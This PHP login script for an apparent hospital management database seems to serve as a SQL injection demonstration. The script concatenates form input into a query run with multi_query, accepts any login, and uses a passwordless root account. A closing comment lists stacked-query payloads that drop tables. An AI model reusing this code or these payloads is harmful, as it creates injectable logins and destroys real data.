<?php
$servername = "localhost";
$username = "root";
$password = "";
$database = "hms";
// Create connection
$conn = mysqli_connect($servername, $username, $password,$database);
// Check connection

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
    echo "<br>";
    if($_SERVER["REQUEST_METHOD"] == "POST") {
    // username and password sent from form
    $username = $_POST['username'];
    $password = $_POST['password'];


    $sql="SELECT id FROM admin WHERE username = '$username' and password =  '$password';";
    $result = $conn->multi_query($sql);
    // $row = mysqli_fetch_array($result);
    // $active = $row['active'];
    // $count = mysqli_num_rows($result);
    // $count=$result->num_rows;
    if($result) {
    $_SESSION["myusername"]=$username;
    $_SESSION['login_user'] = $username;
    header("location: welcome.php");
    }else {
    $error = "Your Login Name or Password is invalid<br><br>";
    echo $error;
    }
}
mysqli_close($conn);
?>


<!-- any';drop table a -- 
any';drop table b --  -->



<!-- 

admin123"; DROP TABLE USERS; 

(DROP TABLE USERS)'";
SELECT id FROM admin WHERE username = 'admin' and password =  'admin123'
SELECT id FROM admin WHERE username = 'admin' and password =  '(drop table users)'
SELECT id FROM admin WHERE username = 'admin' and password =  'admin123';drop table doctorslog
SELECT id FROM admin WHERE username = 'admin' and password =  'admin123';drop table tblcontactus

SELECT id FROM admin WHERE username = 'admin' and password =  'admin123';drop table doctorspecilization#'
SELECT id FROM admin WHERE username = 'admin' and password =  'admin123';drop table doctorspecilization;#'

admin123';drop table doctorspecilization;#'
admin123';drop table doctorspecilization;'
admin123';
drop table doctorspecilization;# -->